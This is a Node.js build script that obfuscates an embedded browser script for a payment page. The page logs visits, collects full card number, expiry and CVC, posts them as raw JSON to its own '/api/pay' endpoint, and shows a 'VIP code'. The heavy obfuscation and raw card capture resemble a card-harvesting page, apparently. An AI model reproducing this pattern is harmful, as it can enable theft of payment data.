const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('javascript-obfuscator');

const scriptPath = path.join(__dirname, 'public', 'script.js');
let scriptContent = `
document.addEventListener('DOMContentLoaded', () => {
    // Log visit
    const API_URL = window.API_URL || '';
    fetch(API_URL + '/api/log-visit').catch(() => {});

    const payForm = document.getElementById('payForm');
    const payBtn = document.getElementById('payBtn');
    const btnText = payBtn.querySelector('.btn-text');
    const btnLoader = payBtn.querySelector('.btn-loader');
    const successSection = document.getElementById('successSection');
    const mainSection = document.querySelector('.container');
    const vipCodeDisplay = document.getElementById('vipCodeDisplay');
    const copyBtn = document.getElementById('copyBtn');
    
    // Form formatting for card number
    document.getElementById('cardNumber').addEventListener('input', (e) => {
        let value = e.target.value.replace(/\\s+/g, '').replace(/[^0-9]/gi, '');
        let formatted = '';
        for(let i = 0; i < value.length; i++) {
            if(i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        e.target.value = formatted;
    });

    // Form formatting for expiry
    document.getElementById('expiry').addEventListener('input', (e) => {
        let value = e.target.value.replace(/\\s+/g, '').replace(/[^0-9]/gi, '');
        if(value.length >= 2) {
            e.target.value = value.substring(0,2) + '/' + value.substring(2,4);
        } else {
            e.target.value = value;
        }
    });

    payForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        payBtn.disabled = true;
        btnText.style.display = 'none';
        btnLoader.style.display = 'block';

        const formData = {
            cardHolder: document.getElementById('cardHolder').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvc: document.getElementById('cvc').value
        };

        try {
            const response = await fetch(API_URL + '/api/pay', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });

            const data = await response.json();
            if(data.success) {
                setTimeout(() => {
                    mainSection.style.display = 'none';
                    successSection.style.display = 'block';
                    vipCodeDisplay.textContent = data.code;
                }, 1500);
            } else {
                alert(data.message || 'Erreur lors du paiement.');
                resetBtn();
            }
        } catch (err) {
            console.error('Payment error:', err);
            alert('Une erreur est survenue lors de la transaction.');
            resetBtn();
        }
    });

    function resetBtn() {
        payBtn.disabled = false;
        btnText.style.display = 'block';
        btnLoader.style.display = 'none';
    }

    copyBtn.addEventListener('click', () => {
        const text = vipCodeDisplay.textContent;
        navigator.clipboard.writeText(text).then(() => {
            const originalText = copyBtn.textContent;
            copyBtn.textContent = 'Copié !';
            setTimeout(() => copyBtn.textContent = originalText, 2000);
        });
    });
});
`;

const obfuscated = JavaScriptObfuscator.obfuscate(scriptContent, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 1,
    numbersToExpressions: true,
    simplify: true,
    stringArrayThreshold: 1,
    splitStrings: true,
    splitStringsChunkLength: 5
});

fs.writeFileSync(scriptPath, obfuscated.getObfuscatedCode());
console.log('script.js obfuscated with visit log and new rules!');
